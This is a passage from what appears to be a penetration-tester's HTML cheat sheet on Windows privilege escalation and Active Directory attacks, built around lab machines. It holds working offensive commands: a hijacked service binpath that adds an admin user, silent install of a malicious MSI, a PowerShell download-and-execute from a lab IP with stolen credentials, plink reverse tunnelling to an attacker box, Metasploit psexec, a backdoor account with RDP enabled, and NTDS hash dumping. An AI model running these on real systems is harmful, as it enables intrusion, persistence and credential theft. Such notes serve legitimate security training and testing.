<li>If you specify the <code class="codehilite"><span class="n">LocalSystem</span></code> account in a call to the <code class="codehilite"><span class="n">CreateService</span></code> or <code class="codehilite"><span class="n">ChangeServiceConfig</span></code> function, any password information you provide is ignored.</li>
<li>The service can open the registry key HKEY_LOCAL_MACHINE\SECURITY.</li>
<li>The service presents the computer's credentials to remote servers.</li>
<li>If the service opens a command window and runs a batch file, the user could hit CTRL+C to terminate the batch file and gain access to a command window with LocalSystem permissions.</li>
<li>A service that runs in the context of the <code class="codehilite"><span class="n">LocalSystem</span></code> account inherits the security context of the SCM. The user SID is created from the <code class="codehilite"><span class="n">SECURITY_LOCAL_SYSTEM_RID</span></code> value. </li>
<li>Has:<ul>
<li>E_ASSIGNPRIMARYTOKEN_NAME (disabled)</li>
<li>SE_AUDIT_NAME (enabled)</li>
<li>SE_BACKUP_NAME (disabled)</li>
<li>SE_CHANGE_NOTIFY_NAME (enabled)</li>
<li>SE_CREATE_GLOBAL_NAME (enabled)</li>
<li>SE_CREATE_PAGEFILE_NAME (enabled)</li>
<li>SE_CREATE_PERMANENT_NAME (enabled)</li>
<li>SE_CREATE_TOKEN_NAME (disabled)</li>
<li>SE_DEBUG_NAME (enabled)</li>
<li>SE_IMPERSONATE_NAME (enabled)</li>
<li>SE_INC_BASE_PRIORITY_NAME (enabled)</li>
<li>SE_INCREASE_QUOTA_NAME (disabled)</li>
<li>SE_LOAD_DRIVER_NAME (disabled)</li>
<li>SE_LOCK_MEMORY_NAME (enabled)</li>
<li>SE_MANAGE_VOLUME_NAME (disabled)</li>
<li>SE_PROF_SINGLE_PROCESS_NAME (enabled)</li>
<li>SE_RESTORE_NAME (disabled)</li>
<li>SE_SECURITY_NAME (disabled)</li>
<li>SE_SHUTDOWN_NAME (disabled)</li>
<li>SE_SYSTEM_ENVIRONMENT_NAME (disabled)</li>
<li>SE_SYSTEMTIME_NAME (disabled)</li>
<li>SE_TAKE_OWNERSHIP_NAME (disabled)</li>
<li>SE_TCB_NAME (enabled)</li>
<li>SE_UNDOCK_NAME (disabled)</li>
</ul>
</li>
</ul>
</li>
<li>LocalService account is a predefined local account used by the service control manager.<ul>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx</a></li>
<li>Has the <strong>same level</strong> of access to resources and objects as members of the <code class="codehilite"><span class="n">Users</span></code> group. </li>
<li>This limited access helps safeguard the system if individual services or processes are compromised.</li>
<li>Services that run as the <code class="codehilite"><span class="k">Local</span> <span class="n">Service</span></code> account access network resources as a <code class="codehilite"><span class="k">null</span> <span class="k">session</span></code> without credentials. </li>
<li><code class="codehilite"><span class="k">Local</span> <span class="n">Service</span></code> account is not supported for the <code class="codehilite"><span class="k">SQL</span> <span class="n">Server</span></code> or <code class="codehilite"><span class="k">SQL</span> <span class="n">Server</span> <span class="n">Agent</span></code> services. </li>
<li>The actual name of the account is <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="k">LOCAL</span> <span class="n">SERVICE</span></code>.</li>
<li>Not recognized by the security subsystem, so you cannot specify its name in a call to the <code class="codehilite"><span class="n">LookupAccountName</span></code> function. </li>
<li>Has minimum privileges on the local computer and presents anonymous credentials on the network.</li>
<li>Can be specified in a call to the <code class="codehilite"><span class="n">CreateService</span></code> and <code class="codehilite"><span class="n">ChangeServiceConfig</span></code> functions. </li>
<li>This account does not have a password, so any password information that you provide in this call is ignored. </li>
<li>While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the <code class="codehilite"><span class="n">LookupAccountSid</span></code> function, but the name of the account must be <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">LocalService</span></code> when you call <code class="codehilite"><span class="n">CreateService</span></code> or <code class="codehilite"><span class="n">ChangeServiceConfig</span></code>, regardless of the locale, or unexpected results can occur.</li>
<li>The LocalService account has its own subkey under the HKEY_USERS registry key. Therefore, the <code class="codehilite"><span class="n">HKEY_CURRENT_USER</span></code> registry key is associated with the LocalService account.</li>
<li>Has:<ul>
<li>SE_ASSIGNPRIMARYTOKEN_NAME (disabled)</li>
<li>SE_AUDIT_NAME (disabled)</li>
<li>SE_CHANGE_NOTIFY_NAME (enabled)</li>
<li>SE_CREATE_GLOBAL_NAME (enabled)</li>
<li>SE_IMPERSONATE_NAME (enabled)</li>
<li>SE_INCREASE_QUOTA_NAME (disabled)</li>
<li>SE_SHUTDOWN_NAME (disabled)</li>
<li>SE_UNDOCK_NAME (disabled)</li>
<li>Any privileges assigned to users and authenticated users</li>
</ul>
</li>
</ul>
</li>
<li>NetworkService account is a predefined local account used by the service control manager. <ul>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx</a></li>
<li>Has <strong>more</strong> access to resources and objects than members of the <code class="codehilite"><span class="n">Users</span></code> group. </li>
<li>Services that run as the <code class="codehilite"><span class="n">Network</span> <span class="n">Service</span></code> account access network resources by using the <code class="codehilite"><span class="n">credentials</span> <span class="k">of</span> <span class="n">the</span> <span class="n">computer</span> <span class="n">account</span></code>. </li>
<li>The actual name of the account is <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">NETWORK</span> <span class="n">SERVICE</span></code>.</li>
<li>Not recognized by the security subsystem, so you cannot specify its name in a call to the <code class="codehilite"><span class="n">LookupAccountName</span></code> function. </li>
<li>Has minimum privileges on the local computer and acts as the computer on the network.</li>
<li>This account can be specified in a call to the <code class="codehilite"><span class="n">CreateService</span></code> and <code class="codehilite"><span class="n">ChangeServiceConfig</span></code> functions. </li>
<li>This account does not have a password, so any password information that you provide in this call is ignored. </li>
<li>While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the <code class="codehilite"><span class="n">LookupAccountSid</span></code> function, but the name of the account must be <code class="codehilite"><span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">NetworkService</span></code> when you call <code class="codehilite"><span class="n">CreateService</span></code> or <code class="codehilite"><span class="n">ChangeServiceConfig</span></code>, regardless of the locale, or unexpected results can occur.</li>
<li>A service that runs in the context of the <code class="codehilite"><span class="n">NetworkService</span></code> account presents the computer's credentials to remote servers. By default, the remote token contains SIDs for the Everyone and Authenticated Users groups. The user SID is created from the <code class="codehilite"><span class="n">SECURITY_NETWORK_SERVICE_RID</span></code> value.</li>
<li>Has its own subkey under the <code class="codehilite"><span class="n">HKEY_USERS</span></code> registry key. Therefore, the <code class="codehilite"><span class="n">HKEY_CURRENT_USER</span></code> registry key is associated with the NetworkService account.</li>
<li>Has:<ul>
<li>SE_ASSIGNPRIMARYTOKEN_NAME (disabled)</li>
<li>SE_AUDIT_NAME (disabled)</li>
<li>SE_CHANGE_NOTIFY_NAME (enabled)</li>
<li>SE_CREATE_GLOBAL_NAME (enabled)</li>
<li>SE_IMPERSONATE_NAME (enabled)</li>
<li>SE_INCREASE_QUOTA_NAME (disabled)</li>
<li>SE_SHUTDOWN_NAME (disabled)</li>
<li>SE_UNDOCK_NAME (disabled)</li>
<li>Any privileges assigned to users and authenticated users</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Convert string to little-endian: <code class="codehilite"><span class="n">iconv</span> <span class="o">-</span><span class="k">to</span><span class="o">-</span><span class="n">code</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">16</span><span class="n">LE</span></code><ul>
<li>Should be done before base64 encoding for <code class="codehilite"><span class="o">-</span><span class="n">ExecuteCommand</span></code> in powershell</li>
</ul>
</li>
<li>Enumeration Tips<ul>
<li>Ref: <a href="https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/">https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/</a></li>
<li>Check the <code class="codehilite"><span class="n">policies</span></code> related to <code class="codehilite"><span class="n">Network</span> <span class="k">Access</span> <span class="n">Control</span></code>. Whether it can be bypassed or not.</li>
<li>Go for <code class="codehilite"><span class="n">guest</span> <span class="n">wifi</span></code>. It could lead you to get inside the company network if it is not segregated.</li>
<li>Check for the <code class="codehilite"><span class="n">printers</span></code> in the environment. Try to do printer exploitation. Printers are part of domain network too. Try default passwords.</li>
<li>Check for <code class="codehilite"><span class="n">misconfigurations</span></code> in the systems as well as the network.</li>
<li>At the Domain level, always look for <code class="codehilite"><span class="n">Administrators</span></code> group members instead of going just for <code class="codehilite"><span class="k">Domain</span> <span class="n">Admins</span></code>. Reason being Builtin Administrators group is the superior one. Even "Domain Admins" group is also the member of administrators groups.</li>
<li>Look for User <code class="codehilite"><span class="n">Rights</span> <span class="n">Assignments</span></code> in the <code class="codehilite"><span class="n">GPOs</span></code>. They get checked very rarely. The ones which are configured for Domain Controllers actually have domain rights.</li>
<li>Most of the organizations use the <code class="codehilite"><span class="nv">same</span> <span class="nv">image</span> <span class="k">for</span> <span class="nv">all</span> <span class="nv">of</span> <span class="nv">their</span> <span class="nv">deployments</span></code>. Which means they use <code class="codehilite"><span class="n">same</span> <span class="k">local</span> <span class="k">admin</span> <span class="n">password</span></code>. Always check if same local admin account is being used in whole domain.</li>
<li>Identify <code class="codehilite"><span class="k">Admin</span> <span class="n">Restrictions</span></code>. (Logon Hours, LogonWorkstations) Decoys can be detected using this.</li>
<li>Use <code class="codehilite"><span class="n">Responder</span> <span class="k">to</span> <span class="n">collect</span> <span class="n">NTLM</span> <span class="n">hashes</span></code>.</li>
<li>Check <a href="https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx">SYSVOL</a> too.</li>
<li><code class="codehilite"><span class="n">ShareEnum</span></code> to look for file shares.</li>
</ul>
</li>
<li>Recon<ul>
<li>IP, subnet, default gateway etc: <code class="codehilite"><span class="n">ipconfig</span> <span class="o">/</span><span class="k">all</span></code></li>
<li>Current user name, info in current access token, SID, privs and group that current user belongs to: <code class="codehilite"><span class="n">whoami</span> <span class="o">/</span><span class="k">all</span></code></li>
<li>Local groups on current machine: <code class="codehilite"><span class="n">net</span> <span class="n">localgroup</span></code></li>
<li>Local administrators of current machine: <code class="codehilite"><span class="n">net</span> <span class="n">localgroup</span> <span class="ss">&quot;administrators&quot;</span></code></li>
<li>Active tcp connections, ports, which the computer is listening, ethernet statistics, ip routing table: <code class="codehilite"><span class="n">netstat</span> <span class="o">-</span><span class="n">an</span></code></li>
<li>Running processes with verbose mode: <code class="codehilite"><span class="n">tasklist</span> <span class="o">/</span><span class="n">V</span></code></li>
<li>Startup programs: <code class="codehilite"><span class="n">net</span> <span class="k">start</span></code></li>
<li>Windows services with binary paths: <code class="codehilite"><span class="n">sc</span> <span class="n">qc</span> <span class="o">&lt;</span><span class="n">service</span><span class="o">&gt;</span></code></li>
<li>OS, processor, memory, bios related info: <code class="codehilite"><span class="n">systeminfo</span><span class="o">&gt;</span><span class="k">output</span><span class="p">.</span><span class="n">txt</span></code></li>
<li>Scheduled jobs: <code class="codehilite"><span class="n">schtasks</span> <span class="o">/</span><span class="n">query</span> <span class="o">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="o">/</span><span class="n">v</span></code></li>
<li>Patches installed and figuring out if its missing important any patch: <code class="codehilite"><span class="n">wmic</span> <span class="n">qfe</span> <span class="k">get</span> <span class="n">Caption</span><span class="p">,</span><span class="n">Description</span><span class="p">,</span><span class="n">HotFixID</span><span class="p">,</span><span class="n">InstalledOn</span></code></li>
</ul>
</li>
<li>Domain Network Recon<ul>
<li>Mapping of IP address to its MAC address in the network: <code class="codehilite"><span class="n">arp</span> <span class="o">-</span><span class="n">a</span></code></li>
<li>Domain: <code class="codehilite"><span class="n">echo</span> <span class="o">%</span><span class="n">USERDOMAIN</span><span class="o">%</span></code></li>
<li>Domain controller name: <code class="codehilite"><span class="n">echo</span> <span class="o">%</span><span class="n">logonserver</span><span class="o">%</span></code></li>
<li>List of domain users: <code class="codehilite"><span class="n">net</span> <span class="k">user</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li>List of groups in the domain: <code class="codehilite"><span class="n">net</span> <span class="k">group</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li>AD domain password policy: <code class="codehilite"><span class="n">net</span> <span class="n">accounts</span> <span class="o">/</span><span class="k">domain</span></code></li>
<li>Map AD trust relationships: <code class="codehilite"><span class="n">nltest</span> <span class="o">/</span><span class="n">domain_trusts</span></code></li>
</ul>
</li>
<li>Alternate Data Stream (ADS)<ul>
<li>Listing: <code class="codehilite"><span class="n">dir</span> <span class="o">/</span><span class="n">R</span></code></li>
<li>Find Streams: <code class="codehilite"><span class="err">​</span><span class="k">get</span><span class="o">-</span><span class="n">item</span> <span class="o">-</span><span class="n">path</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span> <span class="o">-</span><span class="n">stream</span> <span class="o">*</span></code></li>
<li>Reading: <code class="codehilite"><span class="err">​</span><span class="n">powershell</span> <span class="k">Get</span><span class="o">-</span><span class="n">Content</span> <span class="o">-</span><span class="n">Path</span> <span class="ss">&quot;hm.txt&quot;</span> <span class="o">-</span><span class="n">Stream</span> <span class="ss">&quot;root.txt&quot;</span></code></li>
<li>Reading: <code class="codehilite"><span class="k">get</span><span class="o">-</span><span class="n">content</span> <span class="n">backup</span><span class="p">.</span><span class="n">zip</span> <span class="o">-</span><span class="n">stream</span> <span class="s1">&#39;pass&#39;</span></code></li>
<li>Reading: <code class="codehilite"><span class="n">streams</span><span class="p">.</span><span class="n">exe</span> <span class="o">/</span><span class="n">accepteula</span> <span class="o">-</span><span class="n">s</span></code> from sysinternals</li>
</ul>
</li>
<li>Services<ul>
<li>Registry entries: <code class="codehilite"><span class="n">HKLM</span><span class="err">\</span><span class="k">SYSTEM</span><span class="err">\</span><span class="n">CurrentControlSet</span><span class="err">\</span><span class="n">Services</span></code></li>
<li>View service properties: <code class="codehilite"><span class="n">sc</span> <span class="n">qc</span> <span class="ss">&quot;Vulnerable Service&quot;</span></code> / <code class="codehilite"><span class="n">net</span> <span class="k">start</span></code></li>
<li>Restarting: <code class="codehilite"><span class="n">sc</span> <span class="n">stop</span> <span class="ss">&quot;Vulnerable Service&quot;</span></code> /  <code class="codehilite"><span class="n">net</span> <span class="n">stop</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span></code></li>
<li>Start: <code class="codehilite"><span class="n">sc</span> <span class="k">start</span> <span class="ss">&quot;Vulnerable Service&quot;</span></code> /  <code class="codehilite"><span class="n">net</span> <span class="k">start</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span></code></li>
<li>Service information: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Service</span><span class="err">​</span> <span class="err">​</span> <span class="ss">&quot;Ubiquiti UniFi Video&quot;</span><span class="err">​</span> <span class="o">|</span> <span class="n">fl</span> <span class="o">*</span></code></li>
<li>Restart PC: <code class="codehilite"><span class="n">shutdown</span> <span class="o">/</span><span class="n">r</span> <span class="o">/</span><span class="n">t</span> <span class="mi">0</span></code></li>
<li>Change binary path: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="ss">&quot;Vulnerable Service&quot;</span> <span class="n">binpath</span><span class="o">=</span> <span class="err">&quot;</span><span class="n">net</span> <span class="k">user</span> <span class="n">eviladmin</span> <span class="n">P4ssw0rd</span><span class="o">@</span> <span class="o">/</span><span class="k">add</span></code></li>
<li>Disable: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="n">servicename</span> <span class="k">start</span><span class="o">=</span> <span class="n">disabled</span></code></li>
<li>Enable: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="n">servicename</span> <span class="k">start</span><span class="o">=</span> <span class="n">demand</span></code></li>
<li>Auto: <code class="codehilite"><span class="n">sc</span> <span class="n">config</span> <span class="n">servicename</span> <span class="k">start</span><span class="o">=</span> <span class="n">auto</span></code></li>
<li>Keep alive - When a service starts in Windows operating systems, it must communicate with the <code class="codehilite"><span class="n">Service</span> <span class="n">Control</span> <span class="n">Manager</span></code>. If it's not, <code class="codehilite"><span class="n">Service</span> <span class="n">Control</span> <span class="n">Manager</span></code> will terminates the process.</li>
</ul>
</li>
<li>Installing MSI
    <div class="codehilite"><pre><span></span><span class="n">msiexec</span> <span class="o">/</span><span class="n">quiet</span> <span class="o">/</span><span class="n">qn</span> <span class="o">/</span><span class="n">i</span> <span class="n">malicious</span><span class="p">.</span><span class="n">msi</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="o">/</span><span class="n">quiet</span> <span class="o">=</span> <span class="n">Suppress</span> <span class="k">any</span> <span class="n">messages</span> <span class="k">to</span> <span class="n">the</span> <span class="k">user</span> <span class="n">during</span> <span class="n">installation</span>
<span class="o">/</span><span class="n">qn</span> <span class="o">=</span> <span class="k">No</span> <span class="n">GUI</span>
<span class="o">/</span><span class="n">i</span> <span class="o">=</span> <span class="n">Regular</span> <span class="p">(</span><span class="n">vs</span><span class="p">.</span> <span class="n">administrative</span><span class="p">)</span> <span class="n">installation</span>
</pre></div></li>
<li>Extract ZIP
    <div class="codehilite"><pre><span></span><span class="nb">Add-Type</span> <span class="n">-assembly</span>
<span class="s1">&#39;system.io.compression.filesystem&#39;</span><span class="p">;</span><span class="no">[io.compression.zipfile]</span><span class="p">::</span><span class="n">ExtractToDirectory</span>
<span class="p">(</span><span class="s2">&quot;C:\backup.zip&quot;</span><span class="p">,</span><span class="s2">&quot;C:\Example\&quot;</span><span class="p">)</span>
</pre></div></li>
<li>View File Systems
    <div class="codehilite"><pre><span></span><span class="n">gdr</span> <span class="o">-</span><span class="n">PSProvider</span> <span class="s1">&#39;FileSystem&#39;</span>
</pre></div></li>
<li>Access shared volume
    <div class="codehilite"><pre><span></span><span class="n">net</span> <span class="n">use</span> <span class="n">y</span><span class="p">:</span> <span class="err">\\</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">57</span><span class="err">\</span><span class="k">c</span><span class="err">$</span> <span class="o">/</span><span class="k">user</span><span class="p">:</span><span class="n">administrator</span> <span class="mi">1234</span><span class="n">test</span>
</pre></div></li>
<li>Open password protected share
    <div class="codehilite"><pre><span></span><span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="n">server</span><span class="p">\</span><span class="n">share</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">test</span> <span class="n">testpassword</span>
<span class="nb">start </span><span class="p">\\</span><span class="n">server</span><span class="p">\</span><span class="n">share</span>
</pre></div></li>
<li>Auto Save Password to PowerShell
    <div class="codehilite"><pre><span></span><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> <span class="n">2</span><span class="p">&gt;</span><span class="n">nul</span> <span class="p">|</span> <span class="n">findstr</span> <span class="s2">&quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nv">$passwd</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Welcome1!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">;</span>
<span class="nv">$creds</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;administrator&#39;</span> <span class="nv">$passwd</span><span class="p">)</span><span class="err">​</span>

<span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="s2">&quot;powershell&quot;</span> <span class="n">-argumentlist</span> <span class="s2">&quot;IEX(New-Object Net.webClient).downloadString(&#39;http://&lt;LAB IP&gt;/writeup&#39;)&quot;</span> <span class="n">-Credential</span> <span class="nv">$creds</span>
</pre></div></li>
<li>Permissions: <code class="codehilite"><span class="n">whoami</span> <span class="o">/</span><span class="n">priv</span></code><ul>
<li>View Permisions: <code class="codehilite"><span class="n">cacls</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span></code></li>
<li>Grant Permissions<code class="codehilite"><span class="n">cacls</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span> <span class="o">/</span><span class="k">grant</span> <span class="n">Alfred</span><span class="p">:</span><span class="n">F</span></code>
  <div class="codehilite"><pre><span></span><span class="n">cacls</span> <span class="s2">&quot;c:\users\Administrator\Desktop\root.txt&quot;</span> <span class="p">/</span><span class="n">E</span> <span class="p">/</span><span class="n">P</span> <span class="n">Alfred</span><span class="err">:</span><span class="n">F</span>

<span class="n">cacls</span> <span class="n">Windows</span> <span class="n">utility</span> <span class="n">to</span> <span class="n">view</span><span class="p">/</span><span class="n">edit</span> <span class="n">file</span> <span class="n">permissions</span>
<span class="p">/</span><span class="n">E</span> <span class="n">to</span> <span class="n">edit</span> <span class="n">ACL</span>
<span class="p">/</span><span class="n">P</span> <span class="n">to</span> <span class="nb">set </span><span class="n">permissions</span>
<span class="n">Alfred</span><span class="err">:</span><span class="n">F</span> <span class="n">to</span> <span class="n">give</span> <span class="n">Alfred</span> <span class="n">full</span> <span class="n">control</span> <span class="n">of</span> <span class="n">the</span> <span class="n">file</span>
</pre></div></li>
<li><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490872(v=technet.10)">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490872(v=technet.10)</a>
  <div class="codehilite"><pre><span></span><span class="n">icacls</span> <span class="ss">&quot;C:\Program Files (x86)\Program Folder&quot;</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">OI</span> <span class="n">This</span> <span class="n">folder</span> <span class="k">and</span> <span class="n">files</span>
<span class="n">CI</span> <span class="n">This</span> <span class="n">folder</span> <span class="k">and</span> <span class="n">subfolders</span>
<span class="n">IO</span> <span class="n">The</span> <span class="n">ACE</span> <span class="n">does</span> <span class="k">not</span> <span class="n">apply</span> <span class="k">to</span> <span class="n">the</span> <span class="k">current</span> <span class="n">file</span><span class="o">/</span><span class="n">directory</span><span class="p">.</span>

<span class="k">No</span> <span class="k">output</span> <span class="n">message</span><span class="p">:</span> <span class="n">This</span> <span class="n">folder</span> <span class="k">only</span>
<span class="p">(</span><span class="n">IO</span><span class="p">)(</span><span class="n">CI</span><span class="p">)</span> <span class="n">This</span> <span class="n">folder</span><span class="p">,</span> <span class="n">subfolders</span> <span class="k">and</span> <span class="n">files</span>
<span class="p">(</span><span class="n">OI</span><span class="p">)(</span><span class="n">CI</span><span class="p">)(</span><span class="n">IO</span><span class="p">)</span> <span class="n">Subfolders</span> <span class="k">and</span> <span class="n">files</span> <span class="k">only</span>
<span class="p">(</span><span class="n">CI</span><span class="p">)(</span><span class="n">IO</span><span class="p">)</span> <span class="n">Subfolders</span> <span class="k">only</span>
<span class="p">(</span><span class="n">OI</span><span class="p">)(</span><span class="n">IO</span><span class="p">)</span> <span class="n">Files</span> <span class="k">only</span>
</pre></div></li>
</ul>
</li>
<li>SSH from Windows to Attacker (Kali)<ul>
<li>Manual<ul>
<li>From Windows: <code class="codehilite"><span class="n">plink</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">l</span> <span class="n">root</span> <span class="o">-</span><span class="n">pw</span>  <span class="o">-</span><span class="n">R</span> <span class="mi">445</span><span class="p">:</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">445</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">14</span><span class="p">.</span><span class="mi">8</span></code></li>
<li>From Attacker:
    <div class="codehilite"><pre><span></span>netstat -ano <span class="p">|</span> grep <span class="m">445</span>
winexe -U Administrator //127.0.0.1 <span class="s2">&quot;cmd.exe&quot;</span>
</pre></div></li>
</ul>
</li>
<li>Metasploit
  <div class="codehilite"><pre><span></span>portfwd add -l <span class="m">445</span> -p <span class="m">445</span> -r <span class="m">127</span>.0.0.1
use exploit/windows/smb/psexec
<span class="nb">set</span> SMBDOMAIN CHATTERBOX
<span class="nb">set</span> SMBUSER Administrators
<span class="nb">set</span> SMBPASS Welcome1!
<span class="nb">set</span> RHOST <span class="m">127</span>.0.0.1
exploit
</pre></div></li>
</ul>
</li>
<li>Add user and enable RDP
    <div class="codehilite"><pre><span></span>net user hacker hacker /add
net localgroup /add Administrators hacker
reg add <span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d <span class="m">0</span> /f
</pre></div></li>
<li><a href="https://stackoverflow.com/questions/23074430/how-to-run-vbscript-from-command-line-without-cscript-wscript">Windows file association</a></li>
</ul>
<h3 id="bypasses">Bypasses<a class="headerlink" href="#bypasses" title="Permanent link">&para;</a></h3>
<ul>
<li>ftp.exe to open processes: <a href="https://twitter.com/yeyint_mth/status/1009732492138442752">https://twitter.com/yeyint_mth/status/1009732492138442752</a></li>
</ul>
<h3 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h3>
<ul>
<li>Patch Extractor : <a href="https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd">https://gist.github.com/moshekaplan/e8d16ed91dc3ca53e73145ba3b2baebd</a> <a href="https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d">https://gist.github.com/anonymous/d55f494982c0097111d3263cf7099c9d</a></li>
<li>ntdsXtract - Active Directory forensic framework: <a href="https://github.com/csababarta/ntdsxtract">https://github.com/csababarta/ntdsxtract</a><ul>
<li>Extract users from ESE DB export:
  <div class="codehilite"><pre><span></span>dsusers.py kotarak.dit.export/datatable.3 kotarak.dit.export/link_table.5 hashdump --syshive
kotarak.bin --passwordhashes --lmoutfile lmout.txt --ntoutfile ntout.txt --pwdformat ophc
</pre></div></li>
<li>Practice:<ul>
<li>HTB: Kotarak</li>
</ul>
</li>
</ul>
</li>
<li>LibEseDB - library to access the Extensible Storage Engine (ESE) Database File (EDB) format: <a href="https://github.com/libyal/libesedb">https://github.com/libyal/libesedb</a><ul>
<li>The ESE database format is used in may different applications like Windows Search, Windows Mail, Exchange, Active Directory, etc.</li>
<li>Dump tables:
  <div class="codehilite"><pre><span></span><span class="n">esedbexport</span> <span class="o">-</span><span class="n">m</span> <span class="n">tables</span> <span class="mi">20170721114636</span><span class="n">_default_192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">110</span><span class="p">.</span><span class="mi">133</span><span class="n">_psexec</span><span class="p">.</span><span class="n">ntdsgrab</span><span class="p">.</span><span class="n">_333512</span><span class="p">.</span><span class="n">dit</span>  
</pre></div></li>
<li>Practice:<ul>
<li>HTB: Kotarak</li>
</ul>
</li>
</ul>
</li>
<li>WinEXE - remotely executes commands on Windows NT/2000/XP/2003 systems from GNU/Linux (and possibly also from other Unices capable of building the Samba 4 software package): <a href="https://sourceforge.net/projects/winexe/">https://sourceforge.net/projects/winexe/</a></li>
<li>PowerUpSQL: <ul>
<li>Dumping Active Directory Domain Info – with PowerUpSQL!: <a href="https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/">https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/</a></li>
</ul>
</li>
<li>Bloodhound - uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify: <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a><ul>
<li>BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment: <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
<li>Find where domain admins are logged in:
  <div class="codehilite"><pre><span></span><span class="n">python</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">bloodhound</span><span class="p">.</span><span class="n">py</span>  <span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="n">USERNAME</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">p</span> <span class="o">&lt;</span><span class="n">PASSWORD</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">d</span> <span class="o">&lt;</span><span class="n">DOMAIN_NAME</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">dc</span> <span class="o">&lt;</span><span class="n">DOMAIN_CONTROLLER_HOSTNAME</span><span class="o">&gt;</span>
<span class="n">neo4j</span> <span class="k">start</span>
<span class="n">bloodhound</span>
</pre></div></li>
</ul>
</li>
<li>LDIFDE: Import/Export information from AD</li>
<li>Sys Internals: <a href="https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx">https://technet.microsoft.com/en-in/sysinternals/bb545021.aspx</a><ul>
<li><code class="codehilite"><span class="n">PsExec</span></code> - Execute processes on remote machine</li>
<li><code class="codehilite"><span class="n">PsFile</span></code> - Displays list of files opened remotely.</li>
<li><code class="codehilite"><span class="n">PsGetSid</span></code> - Translate SID to display name and vice versa</li>
<li><code class="codehilite"><span class="n">PsKill</span></code> - Kill processes on local or remote machine</li>
